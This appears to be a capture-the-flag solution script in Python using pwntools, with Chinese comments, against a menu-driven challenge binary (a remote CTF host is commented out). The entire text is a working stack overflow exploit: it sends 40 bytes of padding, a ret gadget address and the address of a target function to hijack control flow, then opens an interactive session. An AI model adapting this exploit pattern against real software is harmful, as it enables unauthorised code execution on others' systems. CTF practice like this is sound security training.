from pwn import *
p = process('./pwn')
#p = remote('geek.ctfplus.cn',30929)
RET_GADGET_ADDR = 0x40101a 
LAST_LOVE_ADDR  = 0x4012b3 
# 解锁 256 字节的 read()
p.sendlineafter(b'cin >> : ', b'3')
p.sendlineafter(b'give me your love \n', b'love\x00')
#放入ret地址
p.sendlineafter(b'cin >> : ', b'1')
payload_control = b'A' * 40
payload_control += p64(RET_GADGET_ADDR)
p.sendlineafter(b'yes I wait for you forever\n', payload_control)
# 放入lastlove地址
p.sendlineafter(b'cin >> : ', b'2')
payload_rop = p64(LAST_LOVE_ADDR)
p.sendafter(b"Is this necessary? That's my prayer", payload_rop)
p.interactive()
